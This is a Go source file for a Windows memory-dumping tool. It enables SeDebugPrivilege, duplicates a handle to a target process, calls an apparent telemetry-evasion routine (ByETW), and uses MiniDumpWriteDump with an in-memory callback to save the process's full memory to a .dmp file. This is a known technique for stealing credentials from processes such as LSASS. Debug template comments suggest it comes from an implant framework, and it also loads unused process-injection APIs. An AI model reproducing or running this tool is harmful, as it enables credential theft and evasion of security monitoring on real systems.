package main

import (
	"bytes"
	"encoding/binary"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

const (
	ModuleCallback = iota
	ThreadCallback
	ThreadExCallback
	IncludeThreadCallback
	IncludeModuleCallback
	MemoryCallback
	CancelCallback
	WriteKernelMinidumpCallback
	KernelMinidumpStatusCallback
	RemoveMemoryCallback
	IncludeVmRegionCallback
	IoStartCallback
	IoWriteAllCallback
	IoFinishCallback
	ReadMemoryFailureCallback
	SecondaryFlagsCallback
	IsProcessSnapshotCallback
	VmStartCallback
	VmQueryCallback
	VmPreReadCallback
	VmPostReadCallback

	S_FALSE                = 1
	S_OK                   = 0
	TRUE                   = 1
	FALSE                  = 0
	IncrementSize          = 5 * 1024 * 1024
	MiniDumpWithFullMemory = 0x00000002
)

var bytesRead uint32 = 0

type WindowsDump struct {
	data []byte
}

type outDump struct {
	outPtr uintptr
}

func SePrivEnable(s string) error {
	var tokenHandle windows.Token
	thsHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	windows.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		windows.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("LookupPrivilegeValueW failed", err)
		// {{end}}
		return err
	}
	privs := windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("AdjustTokenPrivileges failed", err)
		// {{end}}
		return err
	}
	return nil
}

func main() {
	ByETW()
	pid, _ := strconv.Atoi(os.Args[1])

	if err := SePrivEnable("SeDebugPrivilege"); err != nil {
		return
	}

	hProc, err := windows.OpenProcess(0x0040, false, uint32(pid))
	currentProcHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return
	}
	var lpTargetHandle windows.Handle
	err = windows.DuplicateHandle(hProc, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, 0x00000002)
	if err != nil {
		return
	}

	dump, _ := minidump(uint32(pid), windows.Handle(lpTargetHandle))

	if dump != nil {
		ioutil.WriteFile(strconv.Itoa(int(time.Now().UnixMilli()))+".dmp", dump, 0644)
	}

}

type ProcessMemoryCounters struct {
	Cb                         uint32
	PageFaultCount             uint32
	PeakWorkingSetSize         int
	WorkingSetSize             int
	QuotaPeakPagedPoolUsage    int
	QuotaPagedPoolUsage        int
	QuotaPeakNonPagedPoolUsage int
	QuotaNonPagedPoolUsage     int
	PagefileUsage              int
	PeakPagefileUsage          int
}

var _ unsafe.Pointer

var (
	modDbgHelp  = windows.NewLazySystemDLL("DbgHelp.dll")
	modGdi32    = windows.NewLazySystemDLL("Gdi32.dll")
	modKernel32 = windows.NewLazySystemDLL("Kernel32.dll")
	modUser32   = windows.NewLazySystemDLL("User32.dll")
	modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
	modpsapi    = windows.NewLazySystemDLL("psapi.dll")

	procMiniDumpWriteDump                 = modDbgHelp.NewProc("MiniDumpWriteDump")
	procBitBlt                            = modGdi32.NewProc("BitBlt")
	procCreateCompatibleBitmap            = modGdi32.NewProc("CreateCompatibleBitmap")
	procCreateCompatibleDC                = modGdi32.NewProc("CreateCompatibleDC")
	procDeleteDC                          = modGdi32.NewProc("DeleteDC")
	procDeleteObject                      = modGdi32.NewProc("DeleteObject")
	procGetDIBits                         = modGdi32.NewProc("GetDIBits")
	procSelectObject                      = modGdi32.NewProc("SelectObject")
	procGlobalAlloc                       = modKernel32.NewProc("GlobalAlloc")
	procGlobalFree                        = modKernel32.NewProc("GlobalFree")
	procGlobalLock                        = modKernel32.NewProc("GlobalLock")
	procGlobalUnlock                      = modKernel32.NewProc("GlobalUnlock")
	procGetDC                             = modUser32.NewProc("GetDC")
	procGetDesktopWindow                  = modUser32.NewProc("GetDesktopWindow")
	procReleaseDC                         = modUser32.NewProc("ReleaseDC")
	procImpersonateLoggedOnUser           = modadvapi32.NewProc("ImpersonateLoggedOnUser")
	procLogonUserW                        = modadvapi32.NewProc("LogonUserW")
	procLookupPrivilegeDisplayNameW       = modadvapi32.NewProc("LookupPrivilegeDisplayNameW")
	procLookupPrivilegeNameW              = modadvapi32.NewProc("LookupPrivilegeNameW")
	procCreateProcessW                    = modkernel32.NewProc("CreateProcessW")
	procCreateRemoteThread                = modkernel32.NewProc("CreateRemoteThread")
	procCreateThread                      = modkernel32.NewProc("CreateThread")
	procDeleteProcThreadAttributeList     = modkernel32.NewProc("DeleteProcThreadAttributeList")
	procGetExitCodeThread                 = modkernel32.NewProc("GetExitCodeThread")
	procGetProcessHeap                    = modkernel32.NewProc("GetProcessHeap")
	procHeapAlloc                         = modkernel32.NewProc("HeapAlloc")
	procHeapFree                          = modkernel32.NewProc("HeapFree")
	procHeapReAlloc                       = modkernel32.NewProc("HeapReAlloc")
	procHeapSize                          = modkernel32.NewProc("HeapSize")
	procInitializeProcThreadAttributeList = modkernel32.NewProc("InitializeProcThreadAttributeList")
	procModule32FirstW                    = modkernel32.NewProc("Module32FirstW")
	procPssCaptureSnapshot                = modkernel32.NewProc("PssCaptureSnapshot")
	procQueueUserAPC                      = modkernel32.NewProc("QueueUserAPC")
	procUpdateProcThreadAttribute         = modkernel32.NewProc("UpdateProcThreadAttribute")
	procVirtualAllocEx                    = modkernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx                  = modkernel32.NewProc("VirtualProtectEx")
	procRtlCopyMemory                     = modntdll.NewProc("RtlCopyMemory")
	procGetProcessMemoryInfo              = modpsapi.NewProc("GetProcessMemoryInfo")
)

func GetProcessHeap() (procHeap windows.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetProcessHeap.Addr(), 0, 0, 0, 0)
	procHeap = windows.Handle(r0)
	if procHeap == 0 {
		err = errnoErr(e1)
	}
	return
}

func GetProcessMemoryInfo(process windows.Handle, ppsmemCounters *ProcessMemoryCounters, cb uint32) (err error) {
	r1, _, e1 := syscall.Syscall(procGetProcessMemoryInfo.Addr(), 3, uintptr(process), uintptr(unsafe.Pointer(ppsmemCounters)), uintptr(cb))
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func HeapAlloc(hHeap windows.Handle, dwFlags uint32, dwBytes uintptr) (lpMem uintptr, err error) {
	r0, _, e1 := syscall.Syscall(procHeapAlloc.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(dwBytes))
	lpMem = uintptr(r0)
	if lpMem == 0 {
		err = errnoErr(e1)
	}
	return
}

func MiniDumpWriteDump(hProcess windows.Handle, pid uint32, hFile uintptr, dumpType uint32, exceptionParam uintptr, userStreamParam uintptr, callbackParam uintptr) (err error) {
	r1, _, e1 := syscall.Syscall9(procMiniDumpWriteDump.Addr(), 7, uintptr(hProcess), uintptr(pid), uintptr(hFile), uintptr(dumpType), uintptr(exceptionParam), uintptr(userStreamParam), uintptr(callbackParam), 0, 0)
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func RtlCopyMemory(dest uintptr, src uintptr, dwSize uint32) {
	syscall.Syscall(procRtlCopyMemory.Addr(), 3, uintptr(dest), uintptr(src), uintptr(dwSize))
	return
}

func HeapFree(hHeap windows.Handle, dwFlags uint32, lpMem uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(procHeapFree.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func HeapReAlloc(hHeap windows.Handle, dwFlags uint32, lpMem uintptr, dwBytes uintptr) (lpRes uintptr, err error) {
	r0, _, e1 := syscall.Syscall6(procHeapReAlloc.Addr(), 4, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem), uintptr(dwBytes), 0, 0)
	lpRes = uintptr(r0)
	if lpRes == 0 {
		err = errnoErr(e1)
	}
	return
}

func HeapSize(hHeap windows.Handle, dwFlags uint32, lpMem uintptr) (res uint32, err error) {
	r0, _, e1 := syscall.Syscall(procHeapSize.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
	res = uint32(r0)
	if res == 0 {
		err = errnoErr(e1)
	}
	return
}

func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
	dump := &WindowsDump{}

	heapHandle, err := GetProcessHeap()
	if err != nil {
		return dump.data, err
	}

	procMemCounters := ProcessMemoryCounters{}
	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))
	err = GetProcessMemoryInfo(proc, &procMemCounters, sizeOfMemCounters)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("GetProcessMemoryInfo failed: %s\n", err)
		// {{end}}
		return dump.data, err
	}

	heapSize := procMemCounters.WorkingSetSize + IncrementSize

	dumpBuffer, err := HeapAlloc(heapHandle, 0x00000008, uintptr(heapSize))
	if err != nil {
		return dump.data, err
	}

	outData := outDump{
		outPtr: dumpBuffer,
	}

	callbackInfo := MiniDumpCallbackInformation{
		CallbackRoutine: windows.NewCallback(minidumpCallback),
		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
	}

	err = MiniDumpWriteDump(
		proc,
		pid,
		0,
		MiniDumpWithFullMemory,
		0,
		0,
		uintptr(unsafe.Pointer(&callbackInfo)),
	)

	if err != nil {
		//{{if .Config.Debug}}
		log.Println("Minidump syscall failed:", err)
		//{{end}}
		return dump.data, err
	}
	outBuff := make([]byte, bytesRead)
	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))
	RtlCopyMemory(outBuffAddr, outData.outPtr, bytesRead)
	err = HeapFree(heapHandle, 0, outData.outPtr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("HeapFree failed: \n", err)
		// {{end}}
		return dump.data, err
	}
	dump.data = outBuff
	return dump.data, nil

}

type MiniDumpIOCallback struct {
	Handle      uintptr
	Offset      uint64
	Buffer      uintptr
	BufferBytes uint32
}

type MiniDumpCallbackInput struct {
	ProcessId     uint32
	ProcessHandle uintptr
	CallbackType  uint32
	Io            MiniDumpIOCallback
}

type MiniDumpCallbackOutput struct {
	Status int32
}

type MiniDumpCallbackInformation struct {
	CallbackRoutine uintptr
	CallbackParam   uintptr
}

func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) {
	callbackInput := MiniDumpCallbackInput{}
	ioCallback := MiniDumpIOCallback{}
	bufferSize := unsafe.Sizeof(callbackInput)
	data := make([]byte, bufferSize)
	dataPtr := uintptr(unsafe.Pointer(&data[0]))
	RtlCopyMemory(dataPtr, callbackInputPtr, uint32(bufferSize))
	buffReader := bytes.NewReader(data)
	err := binary.Read(buffReader, binary.LittleEndian, &callbackInput.ProcessId)
	if err != nil {
		return nil, err
	}
	var procHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &procHandle)
	if err != nil {
		return nil, err
	}
	callbackInput.ProcessHandle = uintptr(procHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &callbackInput.CallbackType)
	if err != nil {
		return nil, err
	}
	var ioHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioHandle)
	if err != nil {
		return nil, err
	}
	ioCallback.Handle = uintptr(ioHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.Offset)
	if err != nil {
		return nil, err
	}
	var ioBuffer uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioBuffer)
	if err != nil {
		return nil, err
	}
	ioCallback.Buffer = uintptr(ioBuffer)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.BufferBytes)
	if err != nil {
		return nil, err
	}
	callbackInput.Io = ioCallback
	return &callbackInput, nil
}

func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackOutput *MiniDumpCallbackOutput) uintptr {
	callbackInput, err := getCallbackInput(callbackInputPtr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("getCallbackInput failed: %s\n", err.Error())
		// {{end}}
		return FALSE
	}
	switch callbackInput.CallbackType {
	case IoStartCallback:
		callbackOutput.Status = S_FALSE
	case IoWriteAllCallback:
		callbackOutput.Status = S_OK
		outData := (*outDump)(unsafe.Pointer(callbackParam))
		procHeap, err := GetProcessHeap()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("minidumpCallback GetProcessHeap failed: %s\n", err.Error())
			// {{end}}
			return FALSE
		}
		currentBuffSize, err := HeapSize(procHeap, 0, outData.outPtr)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("minidumpCallback HeapSize failed: %s\n", err.Error())
			// {{end}}
			return FALSE
		}
		bytesAndOffset := callbackInput.Io.Offset + uint64(callbackInput.Io.BufferBytes)
		if bytesAndOffset >= uint64(currentBuffSize) {
			increasedSize := IncrementSize
			if bytesAndOffset <= uint64(currentBuffSize*2) {
				increasedSize = int(currentBuffSize) * 2
			} else {
				increasedSize += int(bytesAndOffset)
			}
			outData.outPtr, err = HeapReAlloc(procHeap, 0, outData.outPtr, uintptr(increasedSize))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("minidumpCallback HeapReAlloc failed: %s\n", err.Error())
				// {{end}}
				return FALSE
			}
		}
		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
		RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
		bytesRead += callbackInput.Io.BufferBytes
	case IoFinishCallback:
		callbackOutput.Status = S_OK
	default:
		return TRUE
	}
	return TRUE
}
